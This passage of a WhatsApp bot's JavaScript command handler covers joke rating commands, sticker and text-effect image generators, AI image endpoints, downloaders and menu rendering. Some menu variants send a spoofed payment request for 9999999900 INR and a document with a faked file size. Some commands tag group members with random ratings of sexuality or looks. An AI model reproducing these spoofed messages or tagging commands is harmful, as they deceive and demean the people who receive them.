    SenseiOfc.sendMessage(from, { image: ppxeon, caption: profile, mentions: [bet] }, { quoted: m })
    break
case 'handsomecheck':
				if (!text) return replygc(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
SenseiOfc.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
					break
case 'beautifulcheck':
				if (!text) return replygc(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
SenseiOfc.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					break
					case 'charactercheck':
					if (!text) return replygc(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					SenseiOfc.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
if (!m.isGroup) return StickGroup()
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
SenseiOfc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByReply.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
SenseiOfc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${mentionByTag[0].split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
SenseiOfc.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SenseiOfc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SenseiOfc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SenseiOfc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await SenseiOfc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
case 'telestick': {
    if (m.isGroup) return StickPrivate()
    if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
        let xeonresources = await Telesticker(args[0])
        await replygc(`Enviando ${xeonresources.length} pegatinas...`)
        if (m.isGroup && xeonresources.length > 30) {
            await replygc('Número de pegatinas superior a 30, el bot las enviará en un chat privado.')
            for (let i = 0; i < xeonresources.length; i++) {
                SenseiOfc.sendMessage(m.sender, { sticker: { url: xeonresources[i].url }})
            }
        } else {
            for (let i = 0; i < xeonresources.length; i++) {
                SenseiOfc.sendMessage(m.chat, { sticker: { url: xeonresources[i].url }})
            }
        }
    } else replygc(`¿Dónde está el enlace de la pegatina de Telegram?\nEjemplo: ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
}
break
case 'shadow': 
case 'write': 
case 'romantic': 
case 'burnpaper':
case 'smoke': 
case 'narutobanner': 
case 'love': 
case 'undergrass':
case 'doublelove': 
case 'coffecup':
case 'underwaterocean':
case 'smokyneon':
case 'starstext':
case 'rainboweffect':
case 'balloontext':
case 'metalliceffect':
case 'embroiderytext':
case 'flamingtext':
case 'stonetext':
case 'writeart':
case 'summertext':
case 'wolfmetaltext':
case 'nature3dtext':
case 'rosestext':
case 'naturetypography':
case 'quotesunder':
case 'shinetext':{
if (!q) return replygc(`Example : ${prefix+command} SenseiOfc`) 
await StickWait()
const photooxy = require('./lib/photooxy')
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
SenseiOfc.sendMessage(m.chat, { image: { url: dehe }, caption: mess.success}, { quoted: m })
}
break
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{

if (!q) return replygc(`Example : ${prefix+command} SenseiOfc`) 
await StickWait()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
SenseiOfc.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
case 'setcmd': {
    if (!m.quoted) return replygc('¡Responde a un mensaje!')
    if (!m.quoted.fileSha256) return replygc('Falta el Hash SHA256')
    if (!text) return replygc('¿Para qué comando?')
    let hash = m.quoted.fileSha256.toString('base64')
    if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygc('No tienes permiso para cambiar este comando de pegatina')
    global.db.data.sticker[hash] = {
        text,
        mentionedJid: m.mentionedJid,
        creator: m.sender,
        at: + new Date,
        locked: false,
    }
    replygc('¡Hecho!')
}
break
case 'delcmd': {
    let hash = m.quoted.fileSha256.toString('base64')
    if (!hash) return replygc('Sin hashes')
    if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return replygc('No tienes permiso para borrar este comando de pegatina')             
    delete global.db.data.sticker[hash]
    replygc('¡Hecho!')
}
break
case 'listcmd': {
    let teks = `
*Lista de Hash*
Información: *negrita* el hash está bloqueado
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
    SenseiOfc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
case 'lockcmd': {
    if (!TheCreator) return StickOwner()
    if (!m.quoted) return replygc('¡Responde a un mensaje!')
    if (!m.quoted.fileSha256) return replygc('Falta el Hash SHA256')
    let hash = m.quoted.fileSha256.toString('base64')
    if (!(hash in global.db.data.sticker)) return replygc('Hash no encontrado en la base de datos')
    global.db.data.sticker[hash].locked = !/^un/i.test(command)
    replygc('¡Hecho!')
}
break
case 'ss': case 'ssweb': {
    if (!q) return replygc(`Ejemplo ${prefix+command} enlace`)
    await StickWait()
    let krt = await scp2.ssweb(q)
    SenseiOfc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case 'pickupline': {
    try {
        let res = await fetch(`https://api.popcat.xyz/pickuplines`)
        if (!res.ok) {
            throw new Error(`La solicitud de API falló con el estado ${res.status}`)
        }
        let json = await res.json()
        let pickupLine = `*Aquí tienes una línea para ligar:*\n\n${await translateToSpanish(json.pickupline)}`
        replygc(pickupLine)
    } catch (error) {
        console.error(error)
    }
}
break
  case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    SenseiOfc.sendMessage(m.chat, { text: message }, 'extendedTextMessage', { quoted: m })
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'dalle': {
  if (!text) return replygc(`*Este comando genera imágenes a partir de indicaciones de texto*\n\n*𝙴jemplo de uso*\n*${prefix + command} Hermosa chica anime*\n*${prefix + command} chica con vestido rosa*`)
  try {
    replygc('*Por favor espera, generando imagen...*')
    const endpoint = `https://cute-tan-gorilla-yoke.cyclic.app/imagine?text=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await SenseiOfc.sendMessage(m.chat, { image: imageBuffer }, { quoted: m })
    } else {
      throw '*Error al generar la imagen*';
    }
  } catch {
    replygc('*¡Oops! Algo salió mal al generar la imagen. Por favor, inténtalo de nuevo más tarde.*')
  }
}
break
case 'dalle2': {
  if (!text) return replygc(`*Este comando genera imágenes a partir de descripciones de texto*\n\n*Uso de ejemplo*\n*${prefix + command} Hermosa chica anime*\n*${prefix + command} chica con vestido rosa*`)
  try {
    replygc('*Por favor espera, generando imagen...*')
    const endpoint = `https://rest-api.akuari.my.id/ai/texttoimage-v3?prompt=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await SenseiOfc.sendMessage(m.chat, { image: imageBuffer }, { quoted: m })
    } else {
      throw '*Error al generar la imagen*';
    }
  } catch {
    replygc('*Oops! Algo salió mal al generar la imagen. Por favor, inténtalo de nuevo más tarde.*')
  }
}
break
case 'openjourney': {
  if (!text) return replygc(`*Este comando genera imágenes a partir de descripciones de texto*\n\n*Uso de ejemplo*\n*${prefix + command} Explora un paisaje natural*\n*${prefix + command} Viaje por la ciudad de noche*`)
  try {
    replygc('*Por favor espera, generando imagen...*')
    const endpoint = `https://rest-api.akuari.my.id/ai/openjourney?prompt=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await SenseiOfc.sendMessage(m.chat, { image: imageBuffer }, { quoted: m })
    } else {
      throw '*Error al generar la imagen*';
    }
  } catch {
    replygc('*Oops! Algo salió mal al generar la imagen. Por favor, inténtalo de nuevo más tarde.*')
  }
}
break
case 'imagina': {
  if (!text) return replygc(`*Este comando genera imágenes a partir de descripciones de texto utilizando la técnica de Stable Diffusion*\n\n*Uso de ejemplo*\n*${prefix + command} Una escena surrealista en el bosque*\n*${prefix + command} Montañas cubiertas de nieve durante el atardecer*`)
  try {
    replygc('*Por favor espera, generando imagen...*')
    const endpoint = `https://rest-api.akuari.my.id/ai/stablediffusion?prompt=${encodeURIComponent(text)}`
    const response = await fetch(endpoint)
    if (response.ok) {
      const imageBuffer = await response.buffer()
      await SenseiOfc.sendMessage(m.chat, { image: imageBuffer }, { quoted: m })
    } else {
      throw '*Error al generar la imagen*';
    }
  } catch {
    replygc('*Oops! Algo salió mal al generar la imagen. Por favor, inténtalo de nuevo más tarde.*')
  }
}
break
  case 'translate': case 'traducir':  {
    if (!q) return replygc(`*¿Dónde está el texto?*\n\n*𝙴jemplo de uso*\n*${prefix + command} <id del idioma> <texto>*\n*${prefix + command} en Hola Mundo*`)
    const langDefecto = 'es';
    const tld = 'cn';
    let err = `
 *Ejemplo:*

*${prefix + command}* <es del idioma> [texto]
*${prefix + command}* en Hola Mundo

≡ *Lista de idiomas admitidos:* 
https://cloud.google.com/translate/docs/languages
`.trim();
    let lang = args[0];
    let texto = args.slice(1).join(' ');
    if ((args[0] || '').length !== 2) {
        lang = langDefecto;
        texto = args.join(' ');
    }
    if (!texto && m.quoted && m.quoted.text) texto = m.quoted.text;
    try {
        let resultado = await translate(texto, { to: lang, autoCorrect: true }).catch(_ => null);
        replygc(resultado.text);
    } catch (e) {
        return replygc(err);
    }
}
break
  case 'mediafire': {
    if (!args[0]) return replygc(`Ingresa el enlace de MediaFire junto al comando`)
    if (!args[0].match(/mediafire/gi)) return replygc(`Enlace incorrecto`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `
    ≡ *MEDIAFIRE*

▢ *Número:* ${filename}
▢ *Tamaño:* ${filesizeH}
▢ *Extensión:* ${ext}
▢ *Subido:* ${aploud}
`.trim()
    SenseiOfc.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
}
break
    case 'tagadmin': case 'listadmin': case 'admin':{
    if (!m.isGroup) return StickGroup()
    const groupAdmins = participants.filter(p => p.admin)
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
    const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
    let text = `   
*Administradores del Grupo:*
${listAdmin}
`.trim()
    SenseiOfc.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'instagram': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
    if (!text) return replygc(`Necesitas proporcionar la URL de cualquier video, publicación, reel o imagen de Instagram`)
    let res
    try {
        res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
    } catch (error) {
        return replygc(`Se produjo un error: ${error.message}`)
    }
    let api_response = await res.json()
    if (!api_response || !api_response.data) {
        return replygc(`No se encontró ningún video o imagen o respuesta no válida de la API.`)
    }
    const mediaArray = api_response.data;
    for (const mediaData of mediaArray) {
        const mediaType = mediaData.type
        const mediaURL = mediaData.url_download
        let cap = `AQUÍ ESTÁ EL ${mediaType.toUpperCase()}`
        if (mediaType === 'video') {
            SenseiOfc.sendMessage(m.chat, { video: { url: mediaURL }, caption: cap }, { quoted: m })
        } else if (mediaType === 'image') {
            SenseiOfc.sendMessage(m.chat, { image: { url: mediaURL }, caption: cap }, { quoted: m })
        }
    }
}
break
case 'totalfeature':
case 'totalfitur':
case 'totalcmd':
case 'totalcommand':
    replygc(`El total de funciones de ${botname} es ${xeonfeature()}`)
break
            case 'menu': case 'menú': case 'help': case 'panel': {
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
            let a = db.data.users[sender]
            let me = m.sender
            let xmenu_oh = `*≿━━━༺ ${botname} ༻━━━≾*
*│* ¡Hola 👋!
*└┬❖*  ${pushname} 
*┌┤✑*  ${ytimewisher} 😄${readmore} 
*│└────────────┈ ⳹
*│*
*└─* 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊 
*│💻 Velocidad :* ${latensie.toFixed(4)} milisegundos
*│⏰ Tiempo de ejecución :* ${runtime(process.uptime())}
*│🤖 Nombre del bot :* ${botname}
*│🆔 Dueño No :* +${ownernumber}
*│🔧 Prefijo :* [ ${xprefix} ]
*│🏠 Modo :* ${SenseiOfc.public ? 'Público' : `Privado`}
*│🏠 Nombre del host :* ${os.hostname()}
*│💽 Plataforma :* ${os.platform()}
*│👥 Usuarios totales :* ${Object.keys(global.db.data.users).length}
*│👊 Total de hits :* ${global.db.data.settings[botNumber].totalhit}
*│👥 Total de chats/Grupos :* ${Object.keys(global.db.data.chats).length}
*│*
*└─* 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
*│🤖 Nombre :* ${pushname}
*│🆔 ID :* +${me.split('@')[0]}
*│📅 Límite :* ${a.limit}
*│🌐 Rol :* ${a.title ? a.title : '-'}
*│🔢 Número de serie :* ${a.serialNumber}
*│*
*└─* 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
*│⏰ Hora :* ${xtime}
*│📅 Fecha :* ${xdate}
*└┬───────────────── ⳹
${allmenu(prefix, hituet)} ⳹`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/1Gkjr4t/777c645d10459ed2c7496c2a6a903fbc.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'allmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${allmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/1Gkjr4t/777c645d10459ed2c7496c2a6a903fbc.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
            case 'ownermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ownermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
